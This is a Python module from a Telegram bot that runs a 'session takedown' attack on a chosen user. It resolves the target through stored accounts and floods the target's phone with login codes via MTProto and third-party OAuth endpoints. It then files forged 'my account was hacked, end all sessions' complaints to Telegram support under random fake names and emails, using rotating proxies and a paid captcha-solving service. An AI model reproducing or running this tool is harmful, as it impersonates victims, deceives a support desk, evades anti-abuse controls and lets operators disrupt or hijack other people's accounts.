import asyncio, glob, json, os, random, re, secrets, time
import urllib.parse
import requests
from telethon import TelegramClient
from telethon.sessions import StringSession
import config as _cfg
from utils import esc_md

scriptDir = os.path.dirname(os.path.abspath(__file__))
apiId = int(_cfg.AUREPORT_API_ID)
apiHash = _cfg.AUREPORT_API_HASH
sessionsDir = os.path.join(scriptDir, "sessions")

supportUrl = "https://telegram.org/support"
captchaUrl = "https://telegram.org/support/captcha"
browserUa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
uaPool = [
    browserUa,
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]
codeServiceEndpoints = [
    "https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin",
    "https://translations.telegram.org/auth/request",
    "https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
    "https://oauth.telegram.org/auth/login?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2F",
    "https://oauth.telegram.org/auth/login?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin",
    "https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F",
]

maleFirst = ["Александр", "Сергей", "Дмитрий", "Андрей", "Алексей", "Иван", "Максим", "Николай", "Владимир", "Игорь", "Михаил", "Роман", "Артём", "Павел", "Денис", "Евгений", "Егор", "Илья", "Кирилл", "Антон"]
femaleFirst = ["Анна", "Мария", "Елена", "Ольга", "Наталья", "Ирина", "Татьяна", "Светлана", "Юлия", "Екатерина", "Виктория", "Ксения", "Александра", "Дарья", "Полина", "Марина", "Алина", "Валерия", "Анастасия", "Софья"]
lastNames = ["Иванов", "Смирнов", "Кузнецов", "Попов", "Соколов", "Лебедев", "Козлов", "Новиков", "Морозов", "Петров", "Волков", "Соловьёв", "Васильев", "Зайцев", "Павлов", "Семёнов", "Голубев", "Виноградов", "Богданов", "Фёдоров"]
maleMid = ["Александрович", "Сергеевич", "Дмитриевич", "Андреевич", "Алексеевич", "Иванович", "Максимович", "Николаевич", "Владимирович", "Игоревич", "Михайлович", "Романович", "Павлович", "Денисович", "Евгеньевич", "Юрьевич"]
femaleMid = ["Александровна", "Сергеевна", "Дмитриевна", "Андреевна", "Алексеевна", "Ивановна", "Максимовна", "Николаевна", "Владимировна", "Игоревна", "Михайловна", "Романовна", "Павловна", "Денисовна", "Евгеньевна", "Юрьевна"]
translitMap = {"а":"a","б":"b","в":"v","г":"g","д":"d","е":"e","ё":"e","ж":"zh","з":"z","и":"i","й":"y","к":"k","л":"l","м":"m","н":"n","о":"o","п":"p","р":"r","с":"s","т":"t","у":"u","ф":"f","х":"kh","ц":"ts","ч":"ch","ш":"sh","щ":"sch","ъ":"","ы":"y","ь":"","э":"e","ю":"yu","я":"ya"}
mailDomains = ["gmail.com", "yandex.ru", "mail.ru", "outlook.com", "yahoo.com", "icloud.com", "proton.me"]

defaultText = (
    "Здравствуйте, поддержка Telegram! У меня возникла большая проблема\n"
    "Мой личный аккаунт {handle} (id{id}) взломали злоумышленники! Я перешёл по ссылке которая выглядела "
    "обычной, но на самом деле была фишинг, затем меня кикнуло с моего аккаунта, на данный момент на нём "
    "проходит рассылка всем моим чатам и контактам от мошенников в виде фишинг-ссылок!\n"
    "Мой номер - {phone}.\n"
    "Пожалуйста, завершите все сеансы на моём аккаунте! Спасибо!"
)

SUBMISSIONS = 2
CODE_SESSIONS = 3
CODE_SERVICE_ROUNDS = 3
SPEED = 1.5
CALL_TIMEOUT = 25.0
PROXY_FALLBACK = True
STICKY_SESSID = True

_BAR_LEN = 10


class SafeDict(dict):
    def __missing__(self, key):
        return "{" + key + "}"


def _bar(pct: int) -> str:
    filled = round(_BAR_LEN * pct / 100)
    return "[" + "▓" * filled + "▒" * (_BAR_LEN - filled) + "]"


def _load_proxies_from_file() -> list[str]:
    path = os.path.join(scriptDir, "proxies.txt")
    try:
        with open(path, encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        result = []
        for line in lines:
            for pfx in ("http://", "socks4://", "socks5://"):
                if line.startswith(pfx):
                    line = line[len(pfx):]
            if line:
                result.append(line)
        return result
    except FileNotFoundError:
        return []


def _rucaptcha_key() -> str:
    return _cfg.RUCAPTCHA_KEY


def translit(value: str) -> str:
    return "".join(translitMap.get(ch, ch) for ch in value.lower())


def randomLegalName():
    if random.random() < 0.7:
        first, last, mid = random.choice(maleFirst), random.choice(lastNames), random.choice(maleMid)
    else:
        first, last, mid = random.choice(femaleFirst), random.choice(lastNames) + "а", random.choice(femaleMid)
    return f"{last} {first} {mid}", first, last


def randomEmail(first: str, last: str) -> str:
    f, l = translit(first), translit(last)
    year = random.randint(1975, 2005)
    styles = [f"{f}.{l}", f"{f}_{l}{year%100:02d}", f"{l}.{f}", f"{f[:1]}.{l}", f"{f}{l}{year}", f"{f}.{l}.{year}", f"{f}-{l}"]
    return f"{random.choice(styles)}@{random.choice(mailDomains)}"


def pickIdentity():
    legal, first, last = randomLegalName()
    email = randomEmail(first, last)
    return legal, email


def buildHttpProxies(proxyStr: str, sessid: str):
    if not proxyStr:
        return None
    parts = proxyStr.split(":")
    if len(parts) == 2:
        return {"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"}
    if len(parts) == 4:
        rawUser, rawPwd = parts[2], parts[3]
        if "{sessid}" in rawUser or "{sessid}" in rawPwd:
            rawUser = rawUser.replace("{sessid}", sessid)
            rawPwd = rawPwd.replace("{sessid}", sessid)
        elif STICKY_SESSID:
            rawUser = f"{rawUser}__sessid.{sessid}"
        user = urllib.parse.quote(rawUser, safe=".;_-")
        pwd = urllib.parse.quote(rawPwd)
        url = f"http://{user}:{pwd}@{parts[0]}:{parts[1]}"
        return {"http": url, "https": url}
    return None


def getForm(session: requests.Session) -> tuple:
    r = session.get(supportUrl, timeout=45, headers={
        "User-Agent": browserUa,
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    })
    r.raise_for_status()
    m = re.search(r'data-sitekey="([^"]+)"', r.text)
    if not m:
        raise RuntimeError("turnstile sitekey not found")
    sitekey = m.group(1)
    action_m = re.search(r'data-action="([^"]+)"', r.text)
    action = action_m.group(1) if action_m else None
    print(f"[SUPPORT] sitekey={sitekey} action={action}", flush=True)
    return sitekey, action


def fetchSupport(proxyStr: str, sessid: str):
    s = requests.Session()
    s.proxies = buildHttpProxies(proxyStr, sessid) or {}
    try:
        sitekey, action = getForm(s)
        return sitekey, action, s
    except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError) as e:
        if not (PROXY_FALLBACK and s.proxies):
            raise
        print(f"[SUPPORT] proxy_dead:{type(e).__name__} -> direct", flush=True)
        d = requests.Session()
        d.proxies = {}
        sitekey, action = getForm(d)
        return sitekey, action, d


def solveTurnstile(sitekey: str, pageUrl: str, key: str, action: str | None = None) -> str:
    task = {"type": "TurnstileTaskProxyless", "websiteURL": pageUrl, "websiteKey": sitekey, "userAgent": browserUa}
    if action:
        task["pageAction"] = action
    create = requests.post("https://api.rucaptcha.com/createTask", timeout=30,
                           json={"clientKey": key, "task": task}).json()
    if create.get("errorId"):
        raise RuntimeError(f"rucaptcha create: {create.get('errorCode') or create}")
    taskId = create["taskId"]
    print(f"[SUPPORT] rucaptcha_task={taskId}", flush=True)
    for _ in range(60):
        time.sleep(5)
        res = requests.post("https://api.rucaptcha.com/getTaskResult", timeout=30,
                            json={"clientKey": key, "taskId": taskId}).json()
        if res.get("errorId"):
            raise RuntimeError(f"rucaptcha poll: {res.get('errorCode') or res}")
        if res.get("status") == "ready":
            return res["solution"]["token"]
    raise RuntimeError("rucaptcha timeout")


def verifyCaptcha(session: requests.Session, token: str) -> bool:
    headers = {
        "User-Agent": browserUa,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://telegram.org",
        "Referer": supportUrl,
    }
    for _ in range(20):
        r = session.post(captchaUrl, data={"token": token}, headers=headers, timeout=30)
        try:
            j = r.json()
        except Exception:
            raise RuntimeError(f"captcha_bad_response:{r.status_code}")
        if j.get("error"):
            raise RuntimeError(f"captcha_error:{j['error']}")
        if j.get("pending"):
            time.sleep(0.3)
            continue
        if j.get("ok"):
            return True
        raise RuntimeError(f"captcha_unexpected:{j}")
    raise RuntimeError("captcha_pending_timeout")


def detectSuccess(status: int, body: str, url: str):
    if status not in (200, 302):
        return False, f"bad_status_{status}"
    low = (body or "").lower()
    if "alert-success" in low or "thanks for your report" in low:
        return True, "alert_success"
    if "invalid captcha" in low:
        return False, "invalid_captcha"
    if "alert-danger" in low:
        m = re.search(r'alert-danger[^>]*>([^<]{0,120})', body or "")
        return False, f"alert:{(m.group(1).strip() if m else '')[:80]}"
    if "success" in (url or "").lower():
        return True, "url_success"
    return False, "no_success_marker"


def submitFinal(session, message: str, phone: str, legalName: str, email: str):
    r = session.post(supportUrl, timeout=60, allow_redirects=True, headers={
        "User-Agent": browserUa,
        "Referer": supportUrl,
        "Origin": "https://telegram.org",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
    }, data={"message": message, "legal_name": legalName, "email": email, "phone": phone, "setln": ""})
    ok, reason = detectSuccess(r.status_code, r.text or "", r.url or "")
    return ok, r.status_code, reason


async def resolveTarget(target: str):
    isId = target.lstrip("@").isdigit()
    sess_files = glob.glob(os.path.join(sessionsDir, "*.session"))
    random.shuffle(sess_files)
    for path in sess_files[:6]:
        c = TelegramClient(path[:-len(".session")], apiId, apiHash)
        try:
            await asyncio.wait_for(c.connect(), timeout=CALL_TIMEOUT)
            if not await c.is_user_authorized():
                await c.disconnect()
                continue
            ent = await asyncio.wait_for(
                c.get_entity(int(target)) if isId else c.get_entity(target),
                timeout=CALL_TIMEOUT
            )
            return (getattr(ent, "username", "") or ""), int(getattr(ent, "id", 0))
        except Exception:
            pass
        finally:
            try:
                await c.disconnect()
            except Exception:
                pass
    return "", (int(target) if isId else 0)


async def sendCodeOnce(phone: str) -> tuple[bool, str | None]:
    c = TelegramClient(StringSession(), apiId, apiHash)
    try:
        await asyncio.wait_for(c.connect(), timeout=CALL_TIMEOUT)
        await asyncio.wait_for(c.send_code_request(phone), timeout=CALL_TIMEOUT)
        return True, None
    except Exception as e:
        return False, f"{type(e).__name__}:{e}"
    finally:
        try:
            await c.disconnect()
        except Exception:
            pass


def serviceRoundOnce(phone: str, proxyStr: str, sessid: str) -> int:
    proxies = buildHttpProxies(proxyStr, sessid) if proxyStr else None
    hits = 0
    for url in codeServiceEndpoints:
        try:
            r = requests.post(url, headers={"User-Agent": random.choice(uaPool)},
                              data={"phone": phone}, proxies=proxies, timeout=25)
            if r.status_code in (200, 302):
                hits += 1
        except Exception:
            pass
    return hits


# ─── Прогресс-бар: одно сообщение, редактируемое ─────────────────────────────

class SupportProgress:
    """Единое редактируемое сообщение с поэтапным прогрессом."""

    # Этапы (label, вес в общем прогрессе)
    # веса будут скорректированы под реальное SUBMISSIONS
    STAGE_RESOLVE  = "resolve"
    STAGE_CODES    = "codes"
    STAGE_SERVICE  = "service"
    STAGE_SUBMIT   = "submit"   # по одному на каждый сабмит

    def __init__(self, bot, uid: int, target: str, phone: str, n_submissions: int):
        self._bot = bot
        self._uid = uid
        self._target = target
        self._phone = phone
        self._n = n_submissions
        self._msg_id: int | None = None
        self._start = time.monotonic()

        # stages: list of (key, label, icon, status, detail)
        self._stages = [
            [self.STAGE_RESOLVE, "Этап 1", "🔍", "pending", ""],
            [self.STAGE_CODES,   "Этап 2", "📱", "pending", ""],
            [self.STAGE_SERVICE, "Этап 3", "🔁", "pending", ""],
        ]
        for i in range(1, n_submissions + 1):
            self._stages.append([f"submit_{i}", f"Этап {3 + i}", "📋", "pending", ""])

        self._total_stages = len(self._stages)
        self._done_stages = 0

    def _pct(self) -> int:
        return round(self._done_stages / self._total_stages * 100) if self._total_stages else 100

    def _eta(self) -> str:
        done = self._done_stages
        if done == 0:
            return ""
        elapsed = time.monotonic() - self._start
        remaining = int(elapsed / done * (self._total_stages - done))
        if remaining <= 0:
            return ""
        if remaining < 60:
            return f"~{remaining} сек"
        return f"~{remaining // 60} мин {remaining % 60} сек"

    def _render(self, finished: bool = False) -> str:
        pct = self._pct()
        bar = _bar(pct)
        header = (
            f"🎫 *Снос Сессий*\n"
            f"└─ {self._target} · {self._phone}\n\n"
        )
        if not finished:
            eta = self._eta()
            eta_str = f" — {eta}" if eta else ""
            header += f"{bar} *{pct}%*{eta_str}\n\n"
        else:
            header += f"{bar} *100%*\n\n"

        lines = []
        for stage in self._stages:
            _, label, icon, status, detail = stage
            if status == "pending":
                lines.append(f"⏳ {label}")
            elif status == "active":
                lines.append(f"{icon} {label}...")
            elif status == "ok":
                lines.append(f"✅ {label}")
            elif status == "fail":
                lines.append(f"❌ {label}")

        return header + "\n".join(lines)

    async def _edit(self, finished: bool = False):
        if not self._msg_id:
            return
        try:
            await self._bot.edit_message_text(
                self._render(finished), self._uid, self._msg_id,
                parse_mode="Markdown"
            )
        except Exception:
            pass

    async def start(self):
        try:
            msg = await self._bot.send_message(
                self._uid, self._render(), parse_mode="Markdown"
            )
            self._msg_id = msg.message_id
        except Exception:
            pass

    def _find(self, key: str) -> list | None:
        for s in self._stages:
            if s[0] == key:
                return s
        return None

    async def set_active(self, key: str):
        s = self._find(key)
        if s:
            s[3] = "active"
        await self._edit()

    async def set_ok(self, key: str, detail: str = ""):
        s = self._find(key)
        if s:
            s[3] = "ok"
            s[4] = detail
            self._done_stages += 1
        await self._edit()

    async def set_fail(self, key: str, detail: str = ""):
        s = self._find(key)
        if s:
            s[3] = "fail"
            s[4] = detail
            self._done_stages += 1
        await self._edit()

    async def finish(self, ok_count: int) -> str:
        """Финальное редактирование + возвращает итоговый текст для лога канала."""
        pct = self._pct()
        total = self._n
        # Финальная строка итога
        result_line = f"\n✅ *{ok_count}/{total}* обращений принято" if ok_count else f"\n❌ Все обращения отклонены *{total}/{total}*"

        if self._msg_id:
            text = self._render(finished=True) + result_line
            try:
                await self._bot.edit_message_text(
                    text, self._uid, self._msg_id, parse_mode="Markdown"
                )
            except Exception:
                pass

        return (
            f"🎫 *Снос Сессий завершён*\n"
            f"└─ Цель: {self._target}\n"
            f"└─ Телефон: {self._phone}\n"
            f"└─ Обращений: {ok_count}/{total}"
        )


async def main_support(
    target: str,
    phone: str,
    uid: int,
    username: str,
    notify_bot=None,
    log_bot=None,
    log_channel_id: int | None = None,
    quick: bool = False,
):
    """
    Точка входа.
    notify_bot — Bot для прогресс-сообщений пользователю.
    log_bot / log_channel_id — для лога в канал (опционально).
    quick=True — пропускает этапы 1-3, только сабмиты (для тестирования).
    """
    httpProxyList = _load_proxies_from_file()
    total = max(1, SUBMISSIONS)

    pb = SupportProgress(notify_bot, uid, target, phone, total) if notify_bot else None
    if pb:
        await pb.start()

    async def _log_channel(text: str):
        if log_bot and log_channel_id:
            try:
                await log_bot.send_message(log_channel_id, text, parse_mode="Markdown")
            except Exception:
                pass

    loop = asyncio.get_event_loop()

    if quick:
        # Пропускаем этапы 1-3, берём target как есть
        ctx = {"handle": target.lstrip("@"), "id": 0, "target": target}
        if pb:
            await pb.set_ok(SupportProgress.STAGE_RESOLVE)
            await pb.set_ok(SupportProgress.STAGE_CODES)
            await pb.set_ok(SupportProgress.STAGE_SERVICE)
    else:
        # ── Этап 1: определение цели ─────────────────────────────────────────────
        if pb:
            await pb.set_active(SupportProgress.STAGE_RESOLVE)

        username_resolved, tgId = await resolveTarget(target)
        if not tgId:
            if pb:
                await pb.set_fail(SupportProgress.STAGE_RESOLVE, "не найден")
            return False

        ctx = {
            "handle": f"@{username_resolved}" if username_resolved else f"id{tgId}",
            "id": tgId,
            "target": target,
        }
        if pb:
            await pb.set_ok(SupportProgress.STAGE_RESOLVE)

        # ── Этап 2: MTProto коды входа ───────────────────────────────────────────
        if pb:
            await pb.set_active(SupportProgress.STAGE_CODES)

        codes_ok = 0
        for i in range(CODE_SESSIONS):
            good, _ = await sendCodeOnce(phone)
            if good:
                codes_ok += 1
            if i + 1 < CODE_SESSIONS:
                await asyncio.sleep(1.5 / SPEED)

        if pb:
            await pb.set_ok(SupportProgress.STAGE_CODES)

        # ── Этап 3: сервисные коды ───────────────────────────────────────────────
        if pb:
            await pb.set_active(SupportProgress.STAGE_SERVICE)

        digits = re.sub(r"[^0-9]", "", phone)
        service_total = 0
        for i in range(CODE_SERVICE_ROUNDS):
            proxyStr = random.choice(httpProxyList) if httpProxyList else ""
            sessid = secrets.token_hex(8)
            hits = await loop.run_in_executor(None, lambda p=proxyStr, s=sessid: serviceRoundOnce(digits, p, s))
            service_total += hits
            await asyncio.sleep(1.0 / SPEED)

        if pb:
            await pb.set_ok(SupportProgress.STAGE_SERVICE)

    # ── Этапы 4+: обращения ──────────────────────────────────────────────────
    ok_count = 0
    for idx in range(1, total + 1):
        stage_key = f"submit_{idx}"
        if pb:
            await pb.set_active(stage_key)
        try:
            legalName, email = pickIdentity()
            message_text = defaultText.format_map(SafeDict(
                handle=ctx["handle"], id=ctx["id"], phone=phone, target=ctx["target"],
                name=legalName, email=email
            ))

            sessid = secrets.token_hex(8)
            proxyStr = random.choice(httpProxyList) if httpProxyList else ""
            key = _rucaptcha_key()
            print(f"[SUPPORT] submit_{idx} fetchSupport...", flush=True)
            sitekey, action, session = await loop.run_in_executor(None, lambda p=proxyStr, s=sessid: fetchSupport(p, s))
            print(f"[SUPPORT] submit_{idx} solveTurnstile...", flush=True)
            token = await loop.run_in_executor(None, lambda sk=sitekey, ac=action, k=key: solveTurnstile(sk, supportUrl, k, ac))
            print(f"[SUPPORT] submit_{idx} verifyCaptcha...", flush=True)
            await loop.run_in_executor(None, lambda ses=session, t=token: verifyCaptcha(ses, t))
            await asyncio.sleep(random.uniform(2.0, 5.0) / SPEED)

            ok, status, reason = await loop.run_in_executor(
                None, lambda ses=session: submitFinal(ses, message_text, phone, legalName, email)
            )
            if ok:
                ok_count += 1
                if pb:
                    await pb.set_ok(stage_key)
                print(f"[SUPPORT] ✅ submit_{idx} ok | {email}", flush=True)
            else:
                if pb:
                    await pb.set_fail(stage_key)
                print(f"[SUPPORT] ❌ submit_{idx} fail | reason={reason} status={status} email={email}", flush=True)
        except Exception as e:
            if pb:
                await pb.set_fail(stage_key)
            print(f"[SUPPORT] ❌ submit_{idx} exception: {type(e).__name__}: {e}", flush=True)

    # ── Финал ────────────────────────────────────────────────────────────────
    log_text = ""
    if pb:
        log_text = await pb.finish(ok_count)
    else:
        log_text = (
            f"🎫 *Снос Сессий завершён*\n"
            f"└─ Цель: {target}\n"
            f"└─ Телефон: {phone}\n"
            f"└─ Обращений: {ok_count}/{total}"
        )

    if log_text:
        try:
            import db as _db
            _hidden = await _db.get_is_hidden(uid)
        except Exception:
            _hidden = False
        if _hidden:
            sender_line = "└─ Отправитель: @скрыт"
        else:
            sender_line = f"└─ Отправитель: *@{username}* {uid}"
        await _log_channel(f"{log_text}\n{sender_line}")

    return bool(ok_count)
